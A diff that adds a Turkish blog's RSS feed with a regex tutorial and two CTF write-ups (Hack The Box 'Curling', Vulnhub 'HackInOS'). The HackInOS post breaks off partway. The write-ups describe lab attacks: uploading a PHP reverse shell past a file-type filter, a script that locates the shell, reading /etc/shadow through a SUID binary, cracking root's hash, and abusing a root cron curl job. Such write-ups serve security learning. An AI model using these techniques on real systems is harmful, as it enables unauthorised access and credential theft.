@@ -1,0 +1,1765 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Rıdvan KAPLAN</title>
+	<atom:link href="https://ridvankaplan.github.io/feed" rel="self" type="application/rss+xml" />
+	<link>https://ridvankaplan.github.io/</link>
+	<description>All Izz Well</description>
+	<lastBuildDate>Sat, 09 May 2020 11:41:00 +0000</lastBuildDate>
+	<language>tr</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.1.1</generator>
+	<item>
+		<title>Regular Expressions &#8211; Düzenli İfadeler</title>
+		<link>https://ridvankaplan.github.io/linux/regular-expressions-duzenli-ifadeler.html</link>
+					<comments>https://ridvankaplan.github.io/linux/regular-expressions-duzenli-ifadeler.html#respond</comments>
+		
+		<dc:creator><![CDATA[Rıdvan Kaplan]]></dc:creator>
+		<pubDate>Fri, 12 Apr 2019 06:33:30 +0000</pubDate>
+				<category><![CDATA[Linux]]></category>
+		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=571</guid>
+
+					<description><![CDATA[Merhaba !!! Düzenli ifadeler kısaca regex&#8216;ler bir arama modelini tanımlamak için özel bir metin dizesidir. Örneğin bir metinde arama yapacaksanız Ctrl+F ile kelime kelime arayabilirsiniz.&#8230;]]></description>
+										<content:encoded><![CDATA[
+<p>Merhaba !!!</p>
+
+
+
+<p><strong>Düzenli ifadeler</strong> kısaca<strong> regex</strong>&#8216;ler bir arama modelini tanımlamak için özel bir metin dizesidir. Örneğin bir metinde arama yapacaksanız <strong>Ctrl+F</strong> ile kelime kelime arayabilirsiniz. Ama daha özel bir arama yapmak isterseniz regex&#8217;leri kullanabilirsiniz. </p>
+
+
+
+<span id="more-571"></span>
+
+
+
+<p>Regex karşınıza çok sık çıkmayabilir. Ama programlama, siber güvenlik vs. ile ilgileniyorsanız karşınıza en az birkaç defa çıkacaktır. Regex linux sistemlerde veya birçok programlama dilinde ( Örneğin php, java, python vs.)  kullanılır. Farklı dillerde küçük farklılıklar olsa da aşağı yukarı hepsinde regex aynıdır.</p>
+
+
+
+<p>Giriş yapmadan önce aslında linux kullanan herkes regex kullanmıştır. Ama isminin regex olduğunu bilmiyor olabilir. Örneğin dosyaları listeleyeceksiniz ama dosyanın devamını hatırlamıyorsunuz. Hepsini listelemek için <strong>*</strong> karakterini kullanırız.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/04/regex-1-1.png" alt="" class="wp-image-573"/></figure>
+
+
+
+<p>Regex&#8217;in birçok özel karakteri vardır. Birçoğundan örnekler göstereceğim ama ayrıca sizinde denemenizi tavsiye ederim. </p>
+
+
+
+<p><strong>\d</strong> &#8211; Metindeki 0 ile 9 arasındaki rakamlardan herhangi birisini bulur.</p>
+
+
+
+<p><strong>.</strong> &#8211; Nokta herhangi bir karaktere yani rakam, harf, boşluk ve her şey için kullanılabilir. Eğer gerçek nokta karakterini kullanacaksanız<strong> \ </strong>ile özel olmasından kaçınabilirsiniz.</p>
+
+
+
+<p><strong>[abcz]</strong> &#8211; Köşeli parantez içerisinde harf belirterek eşleşme yapabiliriz. Örnekteki regex&#8217;te eğer metinde abcz harflerinden <strong>herhangi biri</strong> varsa eşleşme yapacaktır.</p>
+
+
+
+<p><strong>[^ab]</strong> &#8211; Köşeli parantez içerisinde <strong>^</strong> karakteri ile olumsuzluk verebiliriz. Örnekteki regex&#8217;te eğer metinde ab harflerinden <strong>herhangi birinden</strong> olmayanlarla eşleşme yapacaktır. </p>
+
+
+
+<p><strong>[a-dA-Z0-4]</strong> &#8211; Köşeli parantez içerisinde belirli harf veya sayı aralıkları verip eşleşme yapabiliriz. Örneğin a ile d arasında, A ile Z arasında veya 0 ile 4 arasında herhangi bir harf, sayı varsa eşleşme yapacaktır. Küçük büyük harf gördüğünüz üzere etkiliyor.</p>
+
+
+
+<p><strong>\w</strong> &#8211; Herhangi bir alfanümerik karakterleri eşleştirmemize yarar. Alfanümerik karakterler <strong>harfler, rakamlar</strong> olabilir. Burada ayrıca _ dahil edilmiştir. Yani <strong>[a-zA-Z0-9_]</strong> regex&#8217;inin kısaltılmış halidir.</p>
+
+
+
+<p><strong>{ }</strong> &#8211; Süslü parantezler içerisinde istediğimiz karakterin aralığını belirtebiliriz. Örneğin<strong> a{3,5}</strong> regex&#8217;inde a harfinden 3 ile 5 arasında olanları eşleştir gibi.</p>
+
+
+
+<p><strong>+ ve *</strong>  karakterleri aşağı yukarı aynı görevi görür. İkisinde de önceki karakterin eşleştiği yere kadar eşleştirir. Örneğin normal de<strong> [a-f]</strong> tek bir karakteri eşleştirir bırakır. Ama  <strong>[a-f]+</strong> a ile f arasında herhangi bir karakter eşleşmeyene kadar devam edecektir.  + ile * farkı ise + da en az 1 karakter eşleşmesi istenir. Ama * da bu istenmez. Yani hiçbir karakter eşleşmese de olur.</p>
+
+
+
+<p><strong>?</strong> &#8211; Soru işaretimiz de özel bir karakterdir. İsteğe bağlı karakter belirtmemize yarar. Örneğin<strong> ab?c </strong> regex&#8217;i <strong>abc </strong>veya <strong>ac</strong> karakterlerini eşleştirecektir. Eğer gerçek<strong> ? </strong>işaretini kullanmak isterseniz<strong> \?</strong> şeklinde kullanabilirsiniz.</p>
+
+
+
+<p><strong>\s</strong> &#8211; Whitespace karakterimizdir. Boşluk, tab veya yeni satır işlemlerinde ortak olarak kullanılır.</p>
+
+
+
+<p><strong>^ ve $</strong>   Eğer <strong>^</strong> karakteri<strong> []</strong> içinde değil de dışında ise olumsuzluk anlamında değil belirttiğimiz karakter grubu satırın başında olmak zorunda anlamındadır.<strong> $ </strong>da tam tersidir. Belirttiği karakter grubu satırın sonunda olduğunda eşleşme yapacaktır. Örneğin<strong> ^Rıdvan Kaplan$ </strong> Satırın başı Rıdvan ile başlayan, arasında 1 boşluk olduktan sonra ve satırın sonu Kaplan ile biten kısımları eşleştirme yapacaktır.</p>
+
+
+
+<p><strong>\D \W \S</strong> &#8211; Özel karakterlerin büyük halleri ise tersi durumunu belirtir. Örneğin<strong> \d</strong> herhangi bir rakamı belirtir. <strong>\D</strong> ise rakam olmayan herhangi bir karakter.</p>
+
+
+
+<p><strong>()</strong>   &#8211; Parantezler ile gruplama yapılabilir. Örnek aşağıda verilmiştir. </p>
+
+
+
+<p>Parantez içerisinde<strong> ?</strong> kullanımı ile gruba isim verilebilir.<strong> (?&lt;İsim&gt;) </strong>şeklinde kullanımı vardır.</p>
+
+
+
+<p>Birkaç örnek yapalım. Bir sitemiz var. Bize görevler veriyor ve çözmemiz isteniyor. Referans olarak kullandığım sitede siz de alıştırmalarınızı yapabilirsiniz.  <a rel="noreferrer noopener" aria-label="https://regexone.com/  (yeni sekmede açılır)" href="https://regexone.com/" target="_blank">https://regexone.com/ </a>  </p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/04/regex-2-2-1024x222.png" alt="" class="wp-image-582"/><figcaption><br></figcaption></figure>
+
+
+
+<p>Bu görevde 3 metin verilmiş. Hepsinin eşleşmesi sağlanacak bir regex yazılması istenmiş. Farklı yolları olsa da örneğin genel olarak <strong>.*</strong> şeklinde daha özel regex yazmamız gerekir. Örneğin <strong>[a-z\d\s&#8221;=]+</strong> şeklinde.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/04/regex-3-1024x358.png" alt="" class="wp-image-583"/><figcaption><br></figcaption></figure>
+
+
+
+<p>Sıradaki görev de ilk 3 metin eşleşecek alttaki 3 metin ise eşleşmemesi isteniyor. Burada da<strong> [cmf]an</strong> şeklinde bir regex ile geçebiliriz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/04/regex-4-1024x348.png" alt="" class="wp-image-584"/><figcaption><br></figcaption></figure>
+
+
+
+<p>Aynı şekilde burada da bazı metinlerin eşleşmemesi isteniyor. A ile C arasında herhangi bir karakter ve devamı alfanümerik olacak şeklinde yazdığımızda geçmiş oluyoruz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/04/regex-5-1024x239.png" alt="" class="wp-image-585"/><figcaption><br></figcaption></figure>
+
+
+
+<p>Burada da wa karakteriyle başlayan, z karakterinden 3 ile 5 aralığı kadar olan ve devamı up ile biten metinleri eşleştiren regex&#8217;imizi yazıyoruz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/04/regex-6-1024x275.png" alt="" class="wp-image-586"/><figcaption><br></figcaption></figure>
+
+
+
+<p>Burada + ile * &#8216;ın farkını kullanıyoruz. * boş olsa da eşleştirir ama + boş olduğunda eşleştirme yapmaz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/04/regex-7-1024x244.png" alt="" class="wp-image-587"/><figcaption><br></figcaption></figure>
+
+
+
+<p>Regex&#8217;lerde gruplama kullanabiliriz. Gruplama şu işimize yarar. Örneğin <strong>.pdf </strong>uzantılı dosyaların isimlerini almamız gerekiyor. Normal <strong>\w+.pdf$</strong> regex&#8217;i ile metni eşleştiririz. Ama dosyanın ismini alamayız. burada gruplama devreye giriyor ve işimizi görüyor. İstediğimiz kısımlara <strong>()</strong> içerisine aldığımızda gruplama işlemini yapıyoruz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/04/regex-8-1024x249.png" alt="" class="wp-image-588"/><figcaption><br></figcaption></figure>
+
+
+
+<p>İç içe gruplama da yapabiliriz. Örnekteki gibi tarih&#8217;in tamamı ve sadece yıl&#8217;ı ayrı ayrı gruplandırabiliriz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/04/regex-9-1024x264.png" alt="" class="wp-image-589"/></figure>
+
+
+
+<p>Birçok kişinin aşina olduğu mantıksal koşul olan <strong>veya</strong>&#8216;yı gruplar içinde kullanabiliriz.<strong> | </strong>karakteriyle kullanılır.</p>
+
+
+
+<p>Bir tane örnekte log üzerinden denedim. Örnek log kendi makineniz üzerinden veya internet üzerinden alabilirsiniz. Benim aldığım site <a href="https://www.sumologic.com/blog/apache-logs-vs-nginx-logs/" target="_blank" rel="noreferrer noopener" aria-label="https://www.sumologic.com/blog/apache-logs-vs-nginx-logs/  (yeni sekmede açılır)">https://www.sumologic.com/blog/apache-logs-vs-nginx-logs/ </a></p>
+
+
+
+<p>Yazdığım regex ve örnek log ektedir. <a href="https://paste.ubuntu.com/p/8cYGT3JW45/">h</a><a rel="noreferrer noopener" aria-label="ttps://paste.ubuntu.com/p/8cYGT3JW45/ (yeni sekmede açılır)" href="https://paste.ubuntu.com/p/8cYGT3JW45/" target="_blank">ttps://paste.ubuntu.com/p/8cYGT3JW45/</a></p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/04/regex-10-1024x529.png" alt="" class="wp-image-603"/></figure>
+
+
+
+<p>Son kısımda kullandığım site  <a rel="noreferrer noopener" aria-label=" (yeni sekmede açılır)" href="http://regex101.com/" target="_blank">http://regex101.com/</a> </p>
+
+
+
+<p>Okuduğunuz için teşekkürler. Yazılarımda herhangi bir teknik hata varsa bildirmekten çekinmeyiniz…<br></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://ridvankaplan.github.io/linux/regular-expressions-duzenli-ifadeler.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Curling &#8211; Hack The Box</title>
+		<link>https://ridvankaplan.github.io/hack-the-box/curling-hack-the-box.html</link>
+					<comments>https://ridvankaplan.github.io/hack-the-box/curling-hack-the-box.html#respond</comments>
+		
+		<dc:creator><![CDATA[Rıdvan Kaplan]]></dc:creator>
+		<pubDate>Sun, 31 Mar 2019 14:49:38 +0000</pubDate>
+				<category><![CDATA[CTF]]></category>
+		<category><![CDATA[Hack The Box]]></category>
+		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=544</guid>
+
+					<description><![CDATA[Merhaba !!! Dün emekliye ayrılan Curling makinesinin çözümünü paylaşacağım. Öncelikle makinemizin ağ haritasını çıkartmak ile başlayalım. Hedef makinemizde 80 ve 22 portları açıkmış. Web tarayıcımızda&#8230;]]></description>
+										<content:encoded><![CDATA[
+<p>Merhaba !!!</p>
+
+
+
+<p>Dün emekliye ayrılan Curling makinesinin çözümünü paylaşacağım. Öncelikle makinemizin ağ haritasını çıkartmak ile başlayalım.</p>
+
+
+
+<span id="more-544"></span>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-1-1.png" alt="" class="wp-image-546"/></figure>
+
+
+
+<p>Hedef makinemizde 80 ve 22 portları açıkmış. Web tarayıcımızda incelemeye başlıyoruz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-3-1024x496.png" alt="" class="wp-image-547"/></figure>
+
+
+
+<p>Yazıların paylaşıldığı bir web sitesi. CTF&#8217;lerden alışkanlık olarak sayfaların kaynak kodlarına bakarım. Burada da bakınca bir şeyler veriyor.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-4.png" alt="" class="wp-image-548"/></figure>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-5.png" alt="" class="wp-image-549"/></figure>
+
+
+
+<p>secret.txt adında bir dosya bulunmakta. String&#8217;e bakıldığında base64 ile encode edildiği anlaşılıyor.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-6.png" alt="" class="wp-image-550"/></figure>
+
+
+
+<p>Linux terminalimizde decode edip parolamızı alıyoruz. İlk önce ssh ile denedim ama bu kadar kolay değilmiş. Web tarafında devam ediyoruz.</p>
+
+
+
+<p>Web sitesinin dizinlerini tarayalım.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-2-1024x546.png" alt="" class="wp-image-551"/></figure>
+
+
+
+<p>Her zamanki komutumuzla ile taradıktan sonra <strong>/administrator</strong> dizinini görüyoruz ve giriş yapmaya çalışıyoruz.</p>
+
+
+
+<p>Parolamız var ama kullanıcı adımız yok. Yazılar arasında biraz gezindikten sonra ilk yazının sonunda <strong>Floris</strong> ismine ulaşıyoruz. Ve giriş yapıyoruz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-7-1024x513.png" alt="" class="wp-image-552"/></figure>
+
+
+
+<p><strong>Joomla 3.8.8</strong> versiyonu sistemde kuruluymuş (Sağ alt kısımda). Buradan sonra aklıma direkt dosya yükleyip veya herhangi bir php dosyanın içeriğini kendi php reverse shell&#8217;imle değiştirerek shell almayı denedim. Bazı linux sistemlerde default olarak <strong>/usr/share/webshells/php/php-reverse-shell.php şeklinde</strong> bulunuyor. </p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-8-1024x332.png" alt="" class="wp-image-553"/></figure>
+
+
+
+<p>Önce nc ile dinleyerek ve değiştirdiğim php sayfasına giderek shell&#8217;i alıyoruz. Buradan sonra yetki yükseltme adımlarına geçiyoruz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-9.png" alt="" class="wp-image-554"/></figure>
+
+
+
+<p>/<strong>home/floris</strong> dizini içinde birkaç dosya bulunmakta. Sadece password_backup adlı bir dosyayı okuma iznimiz bulunmakta. Bazı verilerin <strong>hexdump</strong>&#8216;ı alınmış hali.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-10.png" alt="" class="wp-image-555"/></figure>
+
+
+
+<p>Rahat işlem yapabilmek için <a rel="noreferrer noopener" aria-label="nc ile kendi local'ime  (yeni sekmede açılır)" href="https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/" target="_blank">nc ile kendi local&#8217;ime </a>alıyorum dosyayı. </p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-11-1024x553.png" alt="" class="wp-image-556"/></figure>
+
+
+
+<p>Sonra backup dosyasından password.txt adlı bir dosyayı çıkarttım. Bu kısım Linux 101 olduğu için eğer bilmiyorsanız <a href="https://overthewire.org/wargames/bandit/" target="_blank" rel="noreferrer noopener" aria-label="buradaki örnekleri (yeni sekmede açılır)">buradaki örnekleri</a> çözerek daha iyi öğrenebilirsiniz. </p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-12-1024x524.png" alt="" class="wp-image-557"/></figure>
+
+
+
+<p>Aldığımız parola ile ssh&#8217;a bağlanıyoruz. Ve root olmak için biraz daha inceliyoruz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-13.png" alt="" class="wp-image-558"/></figure>
+
+
+
+<p><strong>/home/floris/admin-area </strong>içinde iki dosyayı fark ediyoruz. </p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-14.png" alt="" class="wp-image-559"/></figure>
+
+
+
+<p>Dosyaların içeriğine baktığımızda <strong>input</strong> dosyasında bir url bulunmakta. <strong>Reportta</strong> ise <strong>curl http://127.0.0.1/ </strong>komutunun çıktısı bulunmakta. Root yetkisi ile çalışıyor ve bizim yazma yetkimiz var. </p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-15.png" alt="" class="wp-image-562"/></figure>
+
+
+
+<p>Burada url kısmına okumak istediğimiz dosyanın yolunu vererek okumayı deneyebiliriz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/curling-16-1.png" alt="" class="wp-image-564"/></figure>
+
+
+
+<p>Biraz bekledikten sonra root yetkisiyle <strong>curl file:///root/root.txt </strong>çalıştıktan sonra report kısmına flag&#8217;imiz düştü</p>
+
+
+
+<p>Okuduğunuz için teşekkürler. Yazılarımda herhangi bir teknik hata varsa bildirmekten çekinmeyiniz…</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/curling-hack-the-box.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>HackInOS: 1 &#8211; Vulnhub</title>
+		<link>https://ridvankaplan.github.io/vulnhub/hackinos-1-vulnhub.html</link>
+					<comments>https://ridvankaplan.github.io/vulnhub/hackinos-1-vulnhub.html#respond</comments>
+		
+		<dc:creator><![CDATA[Rıdvan Kaplan]]></dc:creator>
+		<pubDate>Fri, 15 Mar 2019 16:23:31 +0000</pubDate>
+				<category><![CDATA[CTF]]></category>
+		<category><![CDATA[Vulnhub]]></category>
+		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=526</guid>
+
+					<description><![CDATA[Merhaba !!! Bu yazımda Vulnhub&#8217;ta GaziCyber tarafından hazırlanmış olan HackInOS makinesinin çözümünü paylaşacağım. Eğer makineyi çözmeyi düşünüyorsanız lütfen okumayınız. Takıldığınız yerlerde göz atıp kendiniz uğraşmanız&#8230;]]></description>
+										<content:encoded><![CDATA[
+<p>Merhaba !!!<br><br>Bu yazımda Vulnhub&#8217;ta GaziCyber tarafından hazırlanmış olan HackInOS makinesinin çözümünü paylaşacağım. </p>
+
+
+
+<p>Eğer makineyi çözmeyi düşünüyorsanız lütfen okumayınız. Takıldığınız yerlerde göz atıp kendiniz uğraşmanız size daha çok şey katacaktır. Öncelikle makinenin IP adresini <strong>/etc/hosts</strong> içerisine <strong>localhost</strong> olarak ekliyoruz.<br>Ardından nmap taramamızla açık portları inceliyoruz.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/nmap.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/nmap.png" alt="" class="wp-image-527"/></a></figure>
+
+
+
+<p>Tüm portları taradık ve sadece<strong> 22, 8000</strong> portları açık olduğu gözüküyor.</p>
+
+
+
+<p>8000 portunda http server&#8217;ı çalışıyor. Web tarayıcımızda açtığımız da wordpress&#8217;in çalıştığı gözüküyor. Biraz baktıktan sonra herhangi bir şey bulamadım. </p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/main-page.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/main-page-1024x480.png" alt="" class="wp-image-528"/></a></figure>
+
+
+
+<p>Dirb ile dizinleri tarıyoruz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/dirb.png" alt="" class="wp-image-529"/></figure>
+
+
+
+<p>Dikkatimizi çeken <strong>/robots.txt</strong> bulunmakta. İçerisine baktığımızda iki sayfa ismi bulunmaktadır.</p>
+
+
+
+<pre class="wp-block-preformatted">Disallow:/upload.php
+Disallow:/uploads</pre>
+
+
+
+<p><strong>upload.php </strong>sayfasına baktığımızda dosya transferi  yapmamıza izin veriyor. Ama bazı filtrelemeler bulunmakta. Sayfanın kaynak kodunda ipucu amaçlı bir github linki bulunmakta. İncelediğimiz de upload.php nin kaynak kodu olduğu gözükmektedir.<br></p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/upload-1024x169.png" alt="" class="wp-image-530"/></figure>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/hint.png" alt="" class="wp-image-531"/></figure>
+
+
+
+<pre class="wp-block-code"><code>https:&#47;&#47;github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php</code></pre>
+
+
+
+<p>Github linkinde yüklenen dosyanın kontrol edilmesi ve nereye nasıl isminin değiştirilip yüklendiği gözükmektedir. Dosya ismiyle birlikte <strong>1 ile 100 </strong>arasında rastgele bir sayı ile birleştirip <strong>md5</strong>&#8216;ini aldıktan sonra /uploads/ dizini içerisine uzantısını ekleyip yüklemektedir.</p>
+
+
+
+<p>Örneğin dosya ismi resim.png &gt; resim.png34 &gt; 761d063cafd767ae9504ca2006c4aec7.png  &gt; şeklinde /uploads dizinine yüklemektedir. Ayrıca dosyanın tipi de kontrol edilmektedir.</p>
+
+
+
+<p>Php shell yüklemeyi deneyebiliriz. Öncelikle /usr/share/webshells/php/php-reverse-shell.php dosyasını kendi ip adresimi değiştirerek düzenledim.</p>
+
+
+
+<p>Dosyayı yüklerken burp suite ile araya girip <strong>Content-Type:image/gif</strong> ve ilk satıra <code><strong>GIF89a;</strong></code>ekleyerek değiştiriyoruz. Çünkü kontrol esnasında bunları kontrol ediyor ve değiştirmezsek php uzantılı bir dosya yüklememize izin vermiyor.<br></p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/php-shell-1024x512.png" alt="" class="wp-image-532"/></figure>
+
+
+
+<p>Yükledikten sonra /uploads dizinine baktığımızda forbidden alıyoruz. Yani dosyaları listeleyemiyoruz. Direkt ismi ile kaydetmediği için basit bir python script&#8217;i yazmam gerekti. Betiğim aşağıda bulunmaktadır.</p>
+
+
+
+<pre class="wp-block-code"><code>#!/usr/bin/env python
+
+import hashlib
+import requests
+
+print("******* Find The File !!! ************")
+
+filename = "php-reverse-shell.php"
+
+def request(url):
+    response = requests.head(url)
+    if response.status_code == 200:
+        print "Found!"
+        print url
+
+
+def md5Enc(file):
+	md5 = hashlib.md5(file.encode())
+	md5 = md5.hexdigest()
+	dir = "uploads/" + md5 + ".php"
+	#print(dir)
+	request("http://localhost:8000/" + dir)
+
+def loop():
+	for i in range(1,101):
+		md5Enc(filename + str(i))
+
+def main():
+	loop()
+
+main()
+</code></pre>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/find.png" alt="" class="wp-image-533"/></figure>
+
+
+
+<p>Ekran görüntüsündeki gibi bulduktan sonra <strong>nc</strong> ile dinleyip bağlantıya gidiyorum ve <strong>www-data </strong>kullanıcısı olarak shell alıyorum.<br></p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/user-1024x263.png" alt="" class="wp-image-534"/></figure>
+
+
+
+<p>Python script&#8217;i ile etkileşimli aldıktan sonra yetki yükseltme adımlarına geçiyorum. İlk adımlardan biri olan SUID bit&#8217;e sahip olan dosyaları inceliyorum ve değişik bir komut dikkatimi çekiyor.</p>
+
+
+
+<p> <br></p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/suid.png" alt="" class="wp-image-535"/></figure>
+
+
+
+<p><strong>/usr/bin/tai</strong>l komutu ile dosyaları okuyabiliriz. Eğer bu komut root yetkisi ile çalışıyorsa ki çalışıyor root kullanıcısına özel bir dosya okuyalım. Örneğin <strong>/etc/shadow</strong> dosyası.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/shadow-1024x343.png" alt="" class="wp-image-536"/></figure>
+
+
+
+<p><strong>/etc/shadow </strong>dosyamızda root kullanıcısının parolasının hashli hali çıkıyor. Hemen localimize çekip kırmaya çalışıyoruz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/hash-crack-1024x285.png" alt="" class="wp-image-537"/></figure>
+
+
+
+<p><strong>john</strong> aracımızla kırıyoruz ve root kullanıcısının parolasına sahip oluyoruz.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/root.png" alt="" class="wp-image-538"/></figure>
+
+
+
+<p>Parolamızı girdikten sonra root kullanıcısına geçiyoruz ve flag’imizi okuyoruz. Ama makine henüz bitmiş değil. İç ağdaki diğer makinelerin IP adreslerini bulmak için&nbsp;<strong>arp</strong>&nbsp;komutunu kullanıyorum.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="637" height="144" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/arp.png" alt="" class="wp-image-633" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/arp.png 637w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/arp-300x68.png 300w" sizes="(max-width: 637px) 100vw, 637px" /></figure>
+
+
+
+<p>3 tane IP karşımıza çıktı. Bu makinelerin açık portlarını&nbsp;<strong>nc</strong>&nbsp;ile tarayabiliriz.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="732" height="164" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/scan-ports.png" alt="" class="wp-image-634" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/scan-ports.png 732w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/scan-ports-300x67.png 300w" sizes="(max-width: 732px) 100vw, 732px" /></figure>
+
+
+
+<p>172.18.0.3 ip’li makinede mysql portu açıkmış. İlk makineye girdiğimde konfigürasyon dosyalarını incelerken veritabanı ile ilgili bazı veritabanı bilgileri bulmuştum. /<strong>var/www/html/wp-config.php</strong>&nbsp;dosyasının içerisinde.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="703" height="296" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/wp-pass.png" alt="" class="wp-image-635" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/wp-pass.png 703w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/wp-pass-300x126.png 300w" sizes="(max-width: 703px) 100vw, 703px" /></figure>
+
+
+
+<p>Mysql ile ilgili makineye bağlanmayı deneyelim.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="829" height="516" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-1.png" alt="" class="wp-image-636" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-1.png 829w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-1-300x187.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-1-768x478.png 768w" sizes="(max-width: 829px) 100vw, 829px" /></figure>
+
+
+
+<p>Evet bağlandık ve veritabanlarını görüyoruz. Tablolarını ve verileri inceleyelim.</p>
+
+
+
